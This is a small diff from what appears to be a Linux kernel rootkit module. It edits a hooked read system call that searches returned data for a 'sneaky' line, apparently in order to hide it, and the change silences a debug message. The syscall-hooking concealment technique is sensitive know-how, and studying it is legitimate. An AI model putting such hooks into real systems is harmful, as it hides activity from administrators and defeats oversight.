@@ -99,7 +99,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   if(sneaky_Pos != NULL) {
     //char* line_Pos = strchr(sneaky_Pos, '\n');
     //memmove(temp, sneaky_Pos, line_Pos - sneaky_Pos + 1 );
-    printk("find sneaky line\n");
+    //printk("find sneaky line\n");
 
   }
   return value;
